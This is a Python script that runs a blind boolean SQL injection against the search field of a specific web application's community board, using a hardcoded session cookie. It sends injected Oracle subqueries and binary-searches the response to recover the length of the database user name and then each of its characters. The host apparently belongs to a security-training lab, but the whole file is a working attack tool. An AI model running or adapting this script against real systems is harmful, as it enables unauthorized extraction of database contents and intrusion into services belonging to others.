import requests
import urllib3

urllib3.disable_warnings()

url="https://elms1.skinfosec.co.kr:8082/community6/free"

headers={
    "Content-Type": "application/x-www-form-urlencoded"
}

cookies={
    "JSESSIONID":"3F835DA0F7D1FDE106373DE7753FED17"
}

data = {
    "startDt":"",
    "endDt":"",
    "searchType":"all",
    "keyword":"asdf"
}

def get_length():
    for length in range(1,100) :
        attackQuery = f"EQST%' and (select length(user) from dual)={length} and '1%'='1"
        data["keyword"] = attackQuery

        response = requests.post(url, data=data,headers=headers, cookies=cookies)
        
        if '웹 취약점 진단' in response.text:
            print(f"유저명의 글자수 : {length} 글자")
            return length

length = get_length()

username = ""
for substr in range(1,length+1):
    start = 32 
    end = 127
    count = 1
    while start < end: 
        mid=int((start+end)/2)
        count+=1
        
        attackQuery = f"EQST%' and (select ascii(substr(user, {substr},1)) from dual) > {mid} and '1%'='1"
        data["keyword"] = attackQuery
        response = requests.post(url, data=data, headers=headers, cookies=cookies)

        if '웹 취약점 진단' in response.text:
            start=mid+1
        else:
            end=mid
    username+=chr(end)

print(f"유저명 : {username}")

